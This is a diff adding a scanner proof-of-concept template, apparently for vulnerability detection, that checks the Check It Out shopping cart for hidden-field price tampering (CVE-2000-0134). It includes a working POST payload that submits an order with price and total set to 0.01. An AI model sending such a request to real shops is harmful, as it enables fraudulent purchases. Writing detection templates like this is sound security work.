@@ -1,0 +1,52 @@
+[info]
+author = "ave"
+description = "检测 Check It Out 购物车应用是否存在隐藏表单字段参数篡改漏洞。攻击者可通过拦截响应并修改隐藏字段（如 price、total、quantity 等）的值，以任意价格提交订单，实现欺诈交易。"
+id = "POC-AVE-2000-0120"
+name = "Check It Out 购物车隐藏表单域参数篡改 PoC"
+severity = "high"
+tags = ["ave-2000-0120"]
+vuln_id = [
+    "CVE-2000-0134",
+    "AVE-2000-0120",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cart.asp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "hidden",
+    'type="hidden"',
+    "type=hidden",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/checkout.asp"
+protocol = "http"
+
+[poc.requests.body]
+content = "item_id=1&quantity=1&price=0.01&total=0.01"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "order",
+    "confirm",
+    "success",
+    "total",
+]
